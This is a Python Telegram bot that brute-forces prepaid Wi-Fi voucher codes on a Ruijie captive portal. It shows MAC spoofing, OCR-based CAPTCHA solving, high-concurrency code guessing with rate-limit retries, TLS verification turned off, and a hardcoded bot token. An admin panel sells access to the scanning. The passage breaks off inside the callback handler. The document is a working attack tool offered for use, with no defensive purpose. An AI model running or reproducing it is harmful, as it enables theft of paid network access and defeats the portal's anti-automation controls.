#!/usr/bin/env python3
# ==============================================================
#  Ruijie Voucher Scanner — v10.1 Ultimate Pro
#  🇲🇲 Myanmar Edition (Multi-User Safe & Interactive Admin)
#  - Auto Admin Approval on /start
#  - Interactive Admin Panel (No manual ID typing required)
#  - Isolated aiohttp Connectors for Multi-User Concurrency
#  - Base64 Error Fixed (Direct URL Endpoint)
# ==============================================================

import requests, threading, time, sys, os, asyncio, aiohttp
import random, re, string, json, ssl, urllib3
from datetime import datetime

try:
    import cv2, ddddocr, numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== CONFIG ====================
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce8808ed72&gw_sn=H1U5157001640&gw_address=192.168.77.1&gw_port=2060&ip=192.168.77.9&mac=22:ab:dd:99:c9:cf&slot_num=13&nasip=192.168.3.73&ssid=VLAN77&ustate=0&mac_req=1&url=http%3A%2F%2Fconnectivitycheck%2Egstatic%2Ecom%2Fgenerate%5F204&chap_id=%5C102&chap_challenge=%5C274%5C075%5C257%5C043%5C262%5C110%5C334%5C115%5C037%5C256%5C044%5C233%5C365%5C065%5C215%5C007&v=2"
THREADS            = 50
TELEGRAM_BOT_TOKEN = "8619588804:AAEWJ7V8zJ4eopcb72fDxTPU9ICxpm0VVvk"
TELEGRAM_CHAT_ID   = "5991637594"
RESULT_FILE        = os.path.expanduser("~/scan_results.txt")
USERS_FILE         = os.path.expanduser("~/bot_users_v10.json")

SUPER_ADMINS       = [5991637594]     # 👑 Super Admin IDs
# ================================================


# ==================== STATE ====================
BOT_OFFSET    = 0
users_db      = {}
SCAN_CONTEXTS = {}
SCAN_THREADS  = {}
PENDING_INPUT = {}

_ocr = None
# Direct URL assigned to avoid base64 decoding errors
_post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"


# ==================== USER DB ====================
def _default_user(uid, username=""):
    return {
        "uid":          int(uid),
        "username":     username,
        "approved":     False,
        "added_at":     time.time(),
        "expires_at":   0,
        "banned":       False,
        "hit_limit":    5,
        "hit_used":     0,
        "hit_history":  [],
        "mode":         "digit",
        "length":       6,
        "start":        0,
        "end":          999999,
        "workers":      THREADS,
        "url":          TARGET_URL,
    }


def load_users():
    global users_db
    users_db = {}
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                users_db = json.load(f)
        except Exception:
            users_db = {}
    for sid in SUPER_ADMINS:
        k = str(sid)
        if k not in users_db:
            users_db[k] = _default_user(sid, "SUPER_ADMIN")
        users_db[k]["approved"]   = True
        users_db[k]["banned"]     = False
        users_db[k]["expires_at"] = 0
        users_db[k]["hit_limit"]  = 0
    save_users()


def save_users():
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users_db, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[!] save error: {e}")


def get_user(uid, username=""):
    k = str(uid)
    if k not in users_db:
        users_db[k] = _default_user(uid, username)
        save_users()
    else:
        if username and not users_db[k].get("username"):
            users_db[k]["username"] = username
            save_users()
    return users_db[k]


def set_user(uid, **kwargs):
    u = get_user(uid)
    u.update(kwargs)
    save_users()
    return u


def is_super_admin(uid):
    try:
        return int(uid) in SUPER_ADMINS
    except:
        return False


def check_access(uid):
    if is_super_admin(uid):
        return True, ""
    k = str(uid)
    if k not in users_db:
        return False, ("🚫 <b>အသုံးပြုခွင့် မရှိပါ</b>\n\n"
                       f"သင့် ID: <code>{uid}</code>\n"
                       "Admin ထံ ခွင့်ပြုချက် တောင်းဆိုပြီးပါပြီ။")
    u = users_db[k]
    if not u.get("approved", False):
        return False, ("⏳ <b>သင့်အကောင့်မှာ အတည်ပြုချက် (Approval) စောင့်ဆိုင်းဆဲ ဖြစ်ပါသည်။</b>\n\n"
                       "Admin မှ စစ်ဆေးပြီး အတည်ပြုပေးပါမည်။")
    if u.get("banned"):
        return False, "🚫 <b>သင့်အကောင့်ကို ပိတ်ပင်ထား (Banned) ခြင်း ခံထားရပါသည်။</b>"
    exp = u.get("expires_at", 0)
    if exp and time.time() > exp:
        return False, "⏰ <b>သင့် အသုံးပြုခွင့် သက်တမ်း ကုန်ဆုံးသွားပါပြီ။</b>"
    return True, ""


# ==================== TELEGRAM API ====================
def _tg(method, **kw):
    try:
        r = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}",
                          json=kw, timeout=40)
        return r.json()
    except Exception:
        return {}


def tg_send(chat_id, text, kb=None):
    p = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
         "disable_web_page_preview": True}
    if kb is not None:
        p["reply_markup"] = kb
    return _tg("sendMessage", **p)


def tg_edit(chat_id, msg_id, text, kb=None):
    p = {"chat_id": chat_id, "message_id": msg_id, "text": text,
         "parse_mode": "HTML", "disable_web_page_preview": True}
    if kb is not None:
        p["reply_markup"] = kb
    return _tg("editMessageText", **p)


def tg_answer(cb_id, text="", alert=False):
    return _tg("answerCallbackQuery", callback_query_id=cb_id,
               text=text, show_alert=alert)


# ==================== UI HELPERS ====================
def progress_bar(cur, maxv, width=14):
    if maxv <= 0:
        return f"<code>[{'∞'}] {cur}</code>"
    r = min(1.0, cur / maxv)
    f = int(r * width)
    bar = "█" * f + "░" * (width - f)
    return f"<code>[{bar}] {cur}/{maxv}</code>"


def fmt_remaining(exp_ts):
    if not exp_ts:
        return "♾ အကန့်အသတ်မရှိ"
    left = exp_ts - time.time()
    if left <= 0:
        return "❌ သက်တမ်းကုန်"
    d = int(left // 86400)
    h = int((left % 86400) // 3600)
    m = int((left % 3600) // 60)
    if d > 0:
        return f"{d} ရက် {h} နာရီ"
    if h > 0:
        return f"{h} နာရီ {m} မိနစ်"
    return f"{m} မိနစ်"


def fmt_elapsed(sec):
    sec = int(sec)
    h, r = divmod(sec, 3600)
    m, s = divmod(r, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


# ==================== KEYBOARDS ====================
def kb_main(uid):
    is_super = is_super_admin(uid)
    rows = [
        [{"text": "📡 စကန်မုဒ် ရွေးရန်", "callback_data": "menu:mode"},
         {"text": "⚙️ Workers သတ်မှတ်", "callback_data": "menu:workers"}],
        [{"text": "🔗 URL ထည့်သွင်းရန်", "callback_data": "menu:url"}],
        [{"text": "🚀 စကန် စတင်မည် (Start)", "callback_data": "action:start"}],
        [{"text": "⏹ စကန် ရပ်မည် (Stop)", "callback_data": "action:stop"},
         {"text": "📊 အခြေအနေ စစ်ဆေး", "callback_data": "menu:status"}],
        [{"text": "🎯 တွေ့ရှိခဲ့သော Hit များ", "callback_data": "menu:hitshow"}],
    ]
    if is_super:
        rows.append([{"text": "👑 အက်ဒမင် ထိန်းချုပ်ခန်း (Admin Panel)", "callback_data": "admin:menu"}])
    return {"inline_keyboard": rows}


def kb_admin_main():
    return {"inline_keyboard": [
        [{"text": "👥 User များ စီမံရန်", "callback_data": "admin:userlist"}],
        [{"text": "⏳ အတည်ပြုရန် စောင့်ဆိုင်းဆဲ", "callback_data": "admin:pending"}],
        [{"text": "📣 အားလုံးထံ ကြေညာချက်ပို့", "callback_data": "admin:broadcast"}],
        [{"text": "🛑 စကန်အားလုံးရပ်", "callback_data": "admin:stopall"}],
        [{"text": "« မီနူးသို့ ပြန်သွားရန်", "callback_data": "menu:main"}],
    ]}


def kb_user_control(target_id):
    tid = str(target_id)
    u = users_db.get(tid, {})
    ban_label = "✅ Unban (ပြန်ဖွင့်)" if u.get("banned") else "🚫 Ban (ပိတ်ရန်)"
    app_label = "❌ Unapprove" if u.get("approved") else "✅ Approve (ခွင့်ပြု)"
    return {"inline_keyboard": [
        [{"text": app_label, "callback_data": f"admin:toggleapp:{tid}"},
         {"text": ban_label, "callback_data": f"admin:toggleban:{tid}"}],
        [{"text": "🎯 Hit Limit ပြင်ရန်", "callback_data": f"admin:sethits:{tid}"},
         {"text": "⏰ သက်တမ်းရက် ပြင်ရန်", "callback_data": f"admin:setdays:{tid}"}],
        [{"text": "🗑 User ဖျက်ရန်", "callback_data": f"admin:remove:{tid}"}],
        [{"text": "« User စာရင်းသို့", "callback_data": "admin:userlist"}],
    ]}


def kb_mode():
    return {"inline_keyboard": [
        [{"text": "🔢 ဂဏန်း 6 လုံး", "callback_data": "setmode:digit:6"},
         {"text": "🔢 ဂဏန်း 7 လုံး", "callback_data": "setmode:digit:7"}],
        [{"text": "🔢 ဂဏန်း 8 လုံး", "callback_data": "setmode:digit:8"},
         {"text": "🔢 ဂဏန်း 9 လုံး", "callback_data": "setmode:digit:9"}],
        [{"text": "🔤 အက္ခရာ 6 လုံး", "callback_data": "setmode:letter:6"},
         {"text": "🔤 အက္ခရာ 7 လုံး", "callback_data": "setmode:letter:7"}],
        [{"text": "🔀 ရောနှော 6 လုံး", "callback_data": "setmode:mixed:6"},
         {"text": "🔀 ရောနှော 7 လုံး", "callback_data": "setmode:mixed:7"}],
        [{"text": "✏️ ကိုယ်တိုင်သတ်မှတ် (Range)", "callback_data": "setmode:custom"}],
        [{"text": "« မီနူးသို့", "callback_data": "menu:main"}],
    ]}


# ==================== STATE FORMATTER ====================
def fmt_state(uid):
    u = get_user(uid)
    m = u["mode"]
    if m == "digit":
        mode_str = f"🔢 ဂဏန်း {u['length']} လုံး"
    elif m == "letter":
        mode_str = f"🔤 အက္ခရာ {u['length']} လုံး"
    elif m == "mixed":
        mode_str = f"🔀 ရောနှော {u['length']} လုံး"
    elif m == "custom":
        mode_str = f"✏️ {u['start']} → {u['end']}"
    else:
        mode_str = str(m)

    hits_line = "♾" if u["hit_limit"] == 0 else f"{u['hit_used']}/{u['hit_limit']}"
    access = fmt_remaining(u.get("expires_at", 0))
    running = "🟢 စကန် လုပ်ဆောင်နေသည်" if _is_running(uid) else "🔴 ရပ်ထားသည်"

    name_str = u.get('username', 'User')
    return (
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"  🇲🇲 <b>MK VOUCHER SCANNER v10.1</b>\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"  👤 အမည်       : <b>{name_str}</b>\n"
        f"  🆔 အိုင်ဒီ      : <code>{uid}</code>\n"
        f"  📡 စကန်မုဒ်    : <code>{mode_str}</code>\n"
        f"  ⚙️ Workers    : <code>{u['workers']}</code>\n"
        f"  🎯 Hit ကန့်သတ်  : <code>{hits_line}</code>\n"
        f"  ⏰ သက်တမ်း     : <code>{access}</code>\n"
        f"  📊 အခြေအနေ   : {running}"
    )


def _is_running(uid):
    t = SCAN_THREADS.get(str(uid))
    return t is not None and t.is_alive()


# ==================== NETWORK ENGINE ====================
def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0,255) for _ in range(5)]))


def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


async def get_session_id(sess, session_url):
    url = replace_mac(session_url, get_mac())
    h = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=h, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else None
    except:
        return None


def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr


def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()


async def captcha_text(b):
    return await asyncio.to_thread(_ocr_sync, b)


async def captcha_image(sess, sid):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': sid, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()


async def captcha_verify(sess, sid, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': sid, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return sid if d.get("success") is True else None


async def balance_info(connector, sid):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    for url, hdr in [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{sid}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{sid}', h_macc2),
    ]:
        try:
            async with aiohttp.ClientSession(
                connector=connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=hdr, ssl=False) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    rem = res.get('remainingMinutes')
                    if rem is not None:
                        rem = int(rem)
                        if rem >= 0:
                            hh, mm = divmod(rem, 60)
                            ts = f"{hh}နာရီ {mm}မိနစ်" if hh else f"{mm} မိနစ်"
                        else:
                            ts = f"ကုန်ဆုံး ({rem}m)"
                        return f"📶 {plan} | ⏱ {ts}"
                    tot = res.get('totalMinutes')
                    if tot is not None:
                        hh, mm = divmod(int(tot), 60)
                        ts = f"{hh}နာရီ {mm}မိနစ်" if hh else f"{mm} မိနစ်"
                        return f"📶 {plan} | ⏱ {ts}"
        except:
            continue
    return "📶 အမည်မသိ | ⏱ အချက်အလက်မရှိ"


# ==================== CODE ITERATORS ====================
def iter_range(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c


def iter_digit(n):
    while True:
        yield "".join(random.choice(string.digits) for _ in range(n))


def iter_letter(n):
    while True:
        yield "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def iter_mixed(n):
    pool = string.ascii_lowercase + string.digits
    while True:
        yield "".join(random.choice(pool) for _ in range(n))


# ==================== SCAN CONTEXT ====================
class ScanContext:
    def __init__(self, uid, chat_id):
        self.uid       = uid
        self.chat_id   = chat_id
        self.stop      = False
        self.tried     = 0
        self.hits      = []
        self.found     = []
        self.limited   = []
        self.retries   = 0
        self.start_ts  = time.time()
        self.hit_limit = 0
        self.url       = TARGET_URL
        self.live_msg  = None
        self.mode_label = ""
        self.connector = None


async def perform_check(ctx: ScanContext, code, sem):
    async with sem:
        for attempt in range(3):
            async with aiohttp.ClientSession(
                connector=ctx.connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=30)
            ) as sess:
                sid = await get_session_id(sess, ctx.url)
                if not sid:
                    return

                auth_code = None
                if _HAS_OCR:
                    for _ in range(6):
                        try:
                            img = await captcha_image(sess, sid)
                            txt = await captcha_text(img)
                            if not txt:
                                continue
                            if await captcha_verify(sess, sid, txt):
                                auth_code = txt
                                break
                        except:
                            pass

                if not auth_code:
                    if not _HAS_OCR:
                        auth_code = ""
                    else:
                        return

                if ctx.stop:
                    return

                payload = {
                    "accessCode": code,
                    "sessionId":  sid,
                    "apiVersion": 1,
                    "authCode":   auth_code,
                }
                headers = {
                    "authority":    "portal-as.ruijienetworks.com",
                    "accept":       "*/*",
                    "content-type": "application/json",
                    "origin":       "https://portal-as.ruijienetworks.com",
                    "user-agent":   "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                try:
                    async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                        response = await r.text()
                except:
                    return

            if 'request limited' in response:
                ctx.retries += 1
                await asyncio.sleep(0.5)
                continue
            break
        else:
            return

        ctx.tried += 1

        if 'logonUrl' in response:
            info = await balance_info(ctx.connector, sid)
            ctx.found.append(f"{code} | {info}")
            ctx.hits.append(code)
            _record_hit(ctx.uid, code, info)
            tg_send(ctx.chat_id,
                    f"🎉 <b>Hit တွေ့ရှိပါပြီ!</b>\n\n"
                    f"🎫 ကုဒ်  : <code>{code}</code>\n"
                    f"📶 အချက်အလက်: {info}")
            if ctx.hit_limit > 0 and len(ctx.hits) >= ctx.hit_limit:
                ctx.stop = True

        elif 'STA' in response:
            info = await balance_info(ctx.connector, sid)
            ctx.limited.append(f"{code} | {info}")


def _record_hit(uid, code, info):
    u = get_user(uid)
    u.setdefault("hit_history", [])
    u["hit_history"].append({
        "code": code,
        "info": info,
        "time": time.time(),
    })
    u["hit_used"] = u.get("hit_used", 0) + 1
    save_users()
    try:
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[HIT] uid={uid}  {code}  |  {info}\n")
    except:
        pass


# ==================== SCAN RUNNER ====================
def start_scan(uid, chat_id):
    if _is_running(uid):
        return False, "⚠️ စကန် လုပ်ဆောင်နေဆဲ ဖြစ်ပါသည်။"

    u = get_user(uid)
    ctx = ScanContext(uid, chat_id)
    ctx.url        = u["url"]
    ctx.hit_limit  = u["hit_limit"]
    ctx.start_ts   = time.time()

    SCAN_CONTEXTS[str(uid)] = ctx

    def worker():
        try:
            asyncio.run(_run_scan(ctx))
        except Exception as e:
            tg_send(chat_id, f"❌ Scan Error: <code>{e}</code>")
        finally:
            SCAN_THREADS.pop(str(uid), None)

    t = threading.Thread(target=worker, daemon=True)
    SCAN_THREADS[str(uid)] = t
    t.start()
    return True, "ok"


async def _run_scan(ctx: ScanContext):
    _init_ocr()
    u = get_user(ctx.uid)
    workers = u["workers"]
    
    ctx.connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    voucher_sem = asyncio.Semaphore(workers)

    mode = u["mode"]
    if mode == "custom":
        code_iter = iter_range(u["start"], u["end"])
        ctx.mode_label = f"✏️ Custom ({u['start']}→{u['end']})"
    elif mode == "digit":
        ln = u["length"]
        code_iter = iter_range(0, 10 ** ln - 1)
        ctx.mode_label = f"🔢 ဂဏန်း {ln} လုံး"
    elif mode == "letter":
        code_iter = iter_letter(u["length"])
        ctx.mode_label = f"🔤 အက္ခရာ {u['length']} လုံး"
    elif mode == "mixed":
        code_iter = iter_mixed(u["length"])
        ctx.mode_label = f"🔀 ရောနှော {u['length']} လုံး"
    else:
        code_iter = iter_range(0, 999999)
        ctx.mode_label = "🔢 ဂဏန်း 6 လုံး"

    init_res = tg_send(ctx.chat_id, _progress_text(ctx, done=False))
    if init_res.get("ok"):
        ctx.live_msg = init_res["result"]["message_id"]

    def live_loop():
        while not ctx.stop:
            time.sleep(3)
            if ctx.stop:
                break
            try:
                if ctx.live_msg:
                    tg_edit(ctx.chat_id, ctx.live_msg, _progress_text(ctx, done=False))
            except:
                pass
    threading.Thread(target=live_loop, daemon=True).start()

    checked = 0
    try:
        while not ctx.stop:
            batch = []
            for _ in range(400):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            await asyncio.gather(*[perform_check(ctx, c, voucher_sem) for c in batch], return_exceptions=True)
            checked += len(batch)

            if ctx.hit_limit > 0 and len(ctx.hits) >= ctx.hit_limit:
                ctx.stop = True
                break
    except Exception as e:
        tg_send(ctx.chat_id, f"⚠️ <code>{e}</code>")
    finally:
        try:
            await ctx.connector.close()
        except:
            pass

    el = time.time() - ctx.start_ts

    if ctx.live_msg:
        try:
            tg_edit(ctx.chat_id, ctx.live_msg, _progress_text(ctx, done=True, elapsed=el))
        except:
            pass

    if ctx.found:
        lines = "\n".join(f"  • <code>{c}</code>" for c in ctx.found[:20])
        tg_send(ctx.chat_id,
                f"✅ <b>စကန် လုပ်ဆောင်မှု ပြီးဆုံးပါပြီ</b>\n\n"
                f"⏱ ကြာချိန် : <code>{fmt_elapsed(el)}</code>\n"
                f"📊 စစ်ဆေးပြီး: <code>{checked:,}</code>\n"
                f"🎯 Hit ရရှိမှု : <code>{len(ctx.found)}</code> ခု\n\n"
                f"<b>ရရှိသော ကုဒ်များ:</b>\n{lines}")
    else:
        tg_send(ctx.chat_id,
                f"❌ <b>စကန် ပြီးဆုံးပါပြီ — Hit မတွေ့ရှိပါ</b>\n\n"
                f"⏱ ကြာချိန် : <code>{fmt_elapsed(el)}</code>\n"
                f"📊 စစ်ဆေးပြီး: <code>{checked:,}</code>")


def _progress_text(ctx: ScanContext, done=False, elapsed=None):
    el = elapsed if elapsed is not None else (time.time() - ctx.start_ts)
    spd = ctx.tried / el if el > 0 else 0
    title = "✅ စကန် ပြီးဆုံးပါပြီ" if done else "🚀 <b>စကန် လုပ်ဆောင်နေဆဲပါ...</b>"

    hl = ctx.hit_limit
    if hl > 0:
        hit_bar = progress_bar(len(ctx.hits), hl)
        hit_line = f"  🎯 Hit     : {hit_bar}"
    else:
        hit_line = f"  🎯 Hit     : <code>{len(ctx.hits)}</code> (♾)"

    return (
        f"{title}\n\n"
        f"  📡 မုဒ်     : <code>{ctx.mode_label}</code>\n"
        f"  📊 စစ်ဆေးပြီး : <code>{ctx.tried:,}</code>\n"
        f"{hit_line}\n"
        f"  ⚡ အမြန်နှုန်း: <code>{spd:.1f} c/s</code>\n"
        f"  ⏱ ကြာချိန်   : <code>{fmt_elapsed(el)}</code>"
    )


# ==================== HIT SHOW ====================
def hitshow_text(uid, page=0, per=10):
    u = get_user(uid)
    hist = u.get("hit_history", [])
    total = len(hist)
    if total == 0:
        return ("🎯 <b>Hit မှတ်တမ်း</b>\n\n"
                "<i>ယခုထိ Hit ရှာဖွေတွေ့ရှိထားခြင်း မရှိသေးပါ။</i>")
    hist_sorted = list(reversed(hist))
    start = page * per
    end = start + per
    chunk = hist_sorted[start:end]
    pages = (total + per - 1) // per

    lines = []
    for i, h in enumerate(chunk, start=start + 1):
        t = datetime.fromtimestamp(h["time"]).strftime("%m/%d %H:%M")
        lines.append(f"  {i}. 🎫 <code>{h['code']}</code>\n"
                     f"     {h['info']}\n"
                     f"     🕐 {t}")

    body = "\n".join(lines)
    return (f"🎯 <b>Hit မှတ်တမ်းများ</b>  ({total} ခု)\n"
            f"─────────────────────────\n{body}\n\n"
            f"📄 စာမျက်နှာ {page+1}/{pages}")


def hitshow_kb(uid, page=0, per=10):
    u = get_user(uid)
    total = len(u.get("hit_history", []))
    pages = (total + per - 1) // per if total else 1
    rows = []
    nav = []
    if page > 0:
        nav.append({"text": "⬅️ ရှေ့သို့", "callback_data": f"hitshow:page:{page-1}"})
    if page < pages - 1:
        nav.append({"text": "နောက်သို့ ➡️", "callback_data": f"hitshow:page:{page+1}"})
    if nav:
        rows.append(nav)
    rows.append([{"text": "🗑 မှတ်တမ်းများ အားလုံးရှင်းလင်း", "callback_data": "hitshow:clear"}])
    rows.append([{"text": "« မီနူးသို့ ပြန်သွားရန်", "callback_data": "menu:main"}])
    return {"inline_keyboard": rows}


# ==================== MESSAGE HANDLER ====================
def handle_message(msg):
    chat_id = msg["chat"]["id"]
    uid     = msg["from"]["id"]
    uname   = msg["from"].get("username", "") or msg["from"].get("first_name", "User")
    text    = (msg.get("text") or "").strip()

    u = get_user(uid, uname)

    if is_super_admin(uid):
        u["approved"] = True
        save_users()

    ok, err = check_access(uid)
    if not ok:
        if not u.get("approved", False):
            tg_send(chat_id, err)
            for admin_id in SUPER_ADMINS:
                tg_send(
                    admin_id,
                    f"🔔 <b>User အသစ်မှ အသုံးပြုခွင့် တောင်းဆိုနေပါသည်!</b>\n\n"
                    f"👤 အမည်: <b>{uname}</b>\n"
                    f"🆔 အိုင်ဒီ: <code>{uid}</code>",
                    {
                        "inline_keyboard": [
                            [
                                {"text": "✅ ခွင့်ပြုမည်", "callback_data": f"admin:approve:{uid}"},
                                {"text": "❌ ပယ်ချမည်", "callback_data": f"admin:reject:{uid}"}
                            ]
                        ]
                    }
                )
        else:
            tg_send(chat_id, err)
        return

    if str(uid) in PENDING_INPUT:
        _pending_input(uid, chat_id, text)
        return

    if text in ("/start", "/menu", "menu", "မီနူး"):
        tg_send(chat_id,
                "🇲🇲 <b>MK VOUCHER SCANNER v10.1</b>\n\n" + fmt_state(uid),
                kb_main(uid))
    elif text == "/status":
        tg_send(chat_id, fmt_state(uid), kb_main(uid))
    elif text == "/stop":
        ctx = SCAN_CONTEXTS.get(str(uid))
        if ctx:
            ctx.stop = True
            tg_send(chat_id, "⏹ စကန် ရပ်ရန် အချက်ပြ ပို့လိုက်ပါပြီ။")
        else:
            tg_send(chat_id, "ℹ️ လက်ရှိ လုပ်ဆောင်နေသော စကန် မရှိပါ။")
    elif text == "/id":
        tg_send(chat_id, f"🆔 သင့် Telegram ID: <code>{uid}</code>")
    elif text == "/admin" and is_super_admin(uid):
        tg_send(chat_id, "👑 <b>အက်ဒမင် ထိန်းချုပ်ခန်း (Admin Panel)</b>", kb_admin_main())
    else:
        tg_send(chat_id, "💬 /menu ကို နှိပ်ပြီး မီနူး ဖွင့်ပါ။", kb_main(uid))


# ==================== PENDING INPUT ====================
def _pending_input(uid, chat_id, text):
    wf = PENDING_INPUT.pop(str(uid), None)
    try:
        if wf == "url":
            set_user(uid, url=text)
            tg_send(chat_id, "✅ URL အသစ် သိမ်းဆည်းပြီးပါပြီ။", kb_main(uid))
        elif wf == "workers":
            set_user(uid, workers=max(1, int(text)))
            tg_send(chat_id, f"✅ Workers အရေအတွက်ကို <code>{get_user(uid)['workers']}</code> သို့ ပြောင်းပြီးပါပြီ။", kb_main(uid))
        elif wf == "custom_range":
            parts = text.replace(",", " ").split()
            s, e = int(parts[0]), int(parts[1])
            if e < s: s, e = e, s
            set_user(uid, mode="custom", start=s, end=e)
            tg_send(chat_id, f"✅ Range သတ်မှတ်ပြီး: <code>{s} → {e}</code>", kb_main(uid))
        elif wf and wf.startswith("sethits:"):
            tid = wf.split(":")[1]
            lim = int(text.strip())
            if tid in users_db:
                users_db[tid]["hit_limit"] = lim
                save_users()
                tg_send(chat_id, f"✅ Hit Limit ကို <b>{lim if lim else '♾'}</b> သို့ ပြောင်းပြီးပါပြီ။", kb_admin_main())
            else:
                tg_send(chat_id, "❌ User မတွေ့ပါ။", kb_admin_main())
        elif wf and wf.startswith("setdays:"):
            tid = wf.split(":")[1]
            days = int(text.strip())
            if tid in users_db:
                users_db[tid]["expires_at"] = 0 if days == 0 else time.time() + days * 86400
                save_users()
                tg_send(chat_id, f"✅ သက်တမ်းကို <b>{days if days else '♾'}</b> ရက် သတ်မှတ်ပြီးပါပြီ။", kb_admin_main())
            else:
                tg_send(chat_id, "❌ User မတွေ့ပါ။", kb_admin_main())
        elif wf == "admin_broadcast":
            sent = 0
            for u_id in list(users_db.keys()):
                try:
                    tg_send(int(u_id), f"📣 <b>အထူးကြေညာချက်</b>\n\n{text}")
                    sent += 1
                except:
                    pass
            tg_send(chat_id, f"📣 User {sent} ဦးထံသို့ အောင်မြင်စွာ ပို့ပြီးပါပြီ။", kb_admin_main())
    except Exception as e:
        tg_send(chat_id, f"❌ Error: <code>{e}</code>", kb_main(uid))


# ==================== CALLBACK HANDLER ====================
def handle_callback(cb):
    chat_id = cb["message"]["chat"]["id"]
    msg_id  = cb["message"]["message_id"]
    uid     = cb["from"]["id"]
    data    = cb.get("data", "")

    tg_answer(cb["id"])

    if data.startswith("admin:approve:") or data.startswith("admin:reject:"):
        if not is_super_admin(uid):
            tg_edit(chat_id, msg_id, "🚫 အက်ဒမင် သာ လုပ်ဆောင်နိုင်ပါသည်။")
            return
        parts = data.split(":")
        action = parts[1]
        tid = parts[2]
        if tid in users_db:
            if action == "approve":
                users_db[tid]["approved"] = True
                save_users()
                tg_edit(chat_id, msg_id, f"✅ User ID <code>{tid}</code> ကို ခွင့်ပြုလိုက်ပါပြီ။")
                try:
                    tg_send(int(tid), "🎉 <b>သင့်အကောင့်ကို အက်ဒမင်မှ အတည်ပြုပေးလိုက်ပါပြီ!</b>\n\n💬 /menu ကို နှိပ်ပြီး စတင်နိုင်ပါပြီ။")
                except:
                    pass
            else:
                users_db.pop(tid, None)
                save_users()
